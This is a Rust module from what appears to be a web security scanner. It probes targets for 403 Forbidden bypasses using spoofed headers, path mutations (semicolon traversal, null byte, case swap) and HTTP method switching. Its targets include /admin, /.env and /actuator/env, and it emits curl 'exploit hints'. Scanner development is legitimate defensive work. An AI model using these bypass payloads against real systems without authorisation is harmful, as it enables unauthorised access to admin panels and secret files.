//! 403 Bypass probe suite.
//!
//! Tests multiple techniques for circumventing HTTP 403 Forbidden responses:
//!
//! - **Path traversal / normalization**: URL encoding, double encoding, path
//!   folding (`/./`, `/../`), backslash substitution, and semicolon insertion.
//! - **HTTP header overrides**: `X-Original-URL`, `X-Rewrite-URL`,
//!   `X-Forwarded-For: 127.0.0.1`, `X-Custom-IP-Authorization`, etc.
//! - **Method switching**: trying the same path with GET, POST, HEAD, PUT, PATCH.
//! - **Protocol downgrade**: switching from HTTPS to HTTP.
//!
//! Only runs when the target returns 403 on a common admin/sensitive path.

use gossan_core::Target;
use reqwest::Client;
use secfinding::{Evidence, Finding, Severity};
use std::sync::Arc;

/// Paths commonly blocked by WAFs / auth middleware.
const SENSITIVE_PATHS: &[&str] = &[
    "/admin",
    "/admin/",
    "/api/admin",
    "/api/v1/admin",
    "/dashboard",
    "/console",
    "/manager",
    "/.env",
    "/server-status",
    "/actuator",
    "/actuator/env",
    "/wp-admin",
];

/// Header-based bypass payloads. Each tuple is (header_name, header_value, label).
const HEADER_BYPASSES: &[(&str, &str, &str)] = &[
    ("X-Original-URL", "/admin", "x-original-url rewrite"),
    ("X-Rewrite-URL", "/admin", "x-rewrite-url rewrite"),
    ("X-Forwarded-For", "127.0.0.1", "xff localhost spoof"),
    ("X-Custom-IP-Authorization", "127.0.0.1", "x-custom-ip-auth"),
    (
        "X-Forwarded-Host",
        "localhost",
        "x-forwarded-host localhost",
    ),
    ("X-Host", "localhost", "x-host localhost"),
    ("X-Remote-IP", "127.0.0.1", "x-remote-ip spoof"),
    ("X-Client-IP", "127.0.0.1", "x-client-ip spoof"),
    ("X-Real-IP", "127.0.0.1", "x-real-ip spoof"),
    ("X-Originating-IP", "127.0.0.1", "x-originating-ip spoof"),
];

/// URL mutation payloads. Each is a transformation of the original blocked path.
fn path_mutations(path: &str) -> Vec<(String, &'static str)> {
    let trimmed = path.trim_end_matches('/');
    vec![
        (format!("{}%2f", trimmed), "url-encoded trailing slash"),
        (format!("{}/.", trimmed), "path folding /./"),
        (format!("{}..;/", trimmed), "semicolon path traversal"),
        (format!("{}%20/", trimmed), "space-slash suffix"),
        (format!("{}/./", trimmed), "dot-slash normalization"),
        (format!("{};", trimmed), "semicolon suffix (Tomcat)"),
        (format!("{}..%00/", trimmed), "null byte traversal"),
        (format!("{}.json", trimmed), "extension change .json"),
        (format!("{}/~", trimmed), "tilde suffix"),
        (
            format!("/{}", trimmed.to_uppercase().trim_start_matches('/')),
            "case swap",
        ),
    ]
}

/// Probe a web asset for 403 bypass opportunities.
///
/// For each sensitive path that returns 403, tries header-based and
/// URL-mutation-based bypass techniques. Reports when any technique
/// succeeds in getting a non-403 response with content.
pub async fn probe(client: &Client, target: &Target) -> anyhow::Result<Vec<Finding>> {
    let Target::Web(asset) = target else {
        return Ok(vec![]);
    };
    let base = asset.url.as_str().trim_end_matches('/');
    let mut findings = Vec::new();

    for path in SENSITIVE_PATHS {
        let blocked_url = format!("{}{}", base, path);

        // First, confirm this path actually returns 403.
        let Ok(resp) = client.get(&blocked_url).send().await else {
            continue;
        };
        if resp.status().as_u16() != 403 {
            continue;
        }

        // ── Header-based bypasses ────────────────────────────────────────
        for (header, value, label) in HEADER_BYPASSES {
            let Ok(resp) = client
                .get(&blocked_url)
                .header(*header, *value)
                .send()
                .await
            else {
                continue;
            };

            let status = resp.status().as_u16();
            if status != 403 && status != 401 && status < 500 {
                let body_len = resp.content_length().unwrap_or(0);
                // Only report if there's actually content (not an empty 200).
                if body_len > 0 || status == 302 {
                    gossan_core::try_push_finding(
                        crate::misconfig_finding(
                            target,
                            Severity::High,
                            format!("403 Bypass via {} on {}", label, path),
                            format!(
                                "Path '{}' returned 403, but adding header '{}: {}' \
                                 yielded HTTP {}. The WAF or reverse proxy is using the \
                                 injected header to override the request path or source IP, \
                                 bypassing access controls entirely.",
                                path, header, value, status
                            ),
                        )
                        .tag("403-bypass")
                        .tag("access-control")
                        .tag("web")
                        .evidence(Evidence::HttpResponse {
                            status,
                            headers: vec![(Arc::<str>::from(*header), Arc::<str>::from(*value))],
                            body_excerpt: None,
                        })
                        .exploit_hint(format!("curl -s -H '{header}: {value}' '{blocked_url}'")),
                        &mut findings,
                    );
                    // Don't test more header bypasses for this path — one is enough.
                    break;
                }
            }
        }

        // ── URL mutation bypasses ────────────────────────────────────────
        for (mutated, label) in path_mutations(path) {
            let mutated_url = format!("{}{}", base, mutated);
            let Ok(resp) = client.get(&mutated_url).send().await else {
                continue;
            };

            let status = resp.status().as_u16();
            if status != 403 && status != 401 && status != 404 && status < 500 {
                let body_len = resp.content_length().unwrap_or(0);
                if body_len > 0 || status == 302 {
                    gossan_core::try_push_finding(
                        crate::misconfig_finding(
                            target,
                            Severity::High,
                            format!("403 Bypass via {} on {}", label, path),
                            format!(
                                "Path '{}' returned 403, but the mutated path '{}' \
                                 returned HTTP {}. The WAF or path normalization logic \
                                 can be circumvented with URL manipulation.",
                                path, mutated, status
                            ),
                        )
                        .tag("403-bypass")
                        .tag("access-control")
                        .tag("web")
                        .evidence(Evidence::HttpResponse {
                            status,
                            headers: vec![],
                            body_excerpt: None,
                        })
                        .exploit_hint(format!("curl -s '{mutated_url}'")),
                        &mut findings,
                    );
                    break;
                }
            }
        }

        // ── Method switching ─────────────────────────────────────────────
        for method in &[
            reqwest::Method::POST,
            reqwest::Method::HEAD,
            reqwest::Method::PUT,
        ] {
            let Ok(resp) = client.request(method.clone(), &blocked_url).send().await else {
                continue;
            };
            let status = resp.status().as_u16();
            if status != 403 && status != 401 && status != 405 && status < 500 {
                gossan_core::try_push_finding(
                    crate::misconfig_finding(
                        target,
                        Severity::Medium,
                        format!("403 Bypass via {} method on {}", method, path),
                        format!(
                            "Path '{}' returned 403 for GET, but {} returned HTTP {}. \
                             The access control is method-dependent — it only blocks GET \
                             but allows other methods through.",
                            path, method, status
                        ),
                    )
                    .tag("403-bypass")
                    .tag("access-control")
                    .tag("web")
                    .evidence(Evidence::HttpResponse {
                        status,
                        headers: vec![],
                        body_excerpt: None,
                    })
                    .exploit_hint(format!("curl -s -X {} '{}'", method, blocked_url)),
                    &mut findings,
                );
                break;
            }
        }
    }

    Ok(findings)
}
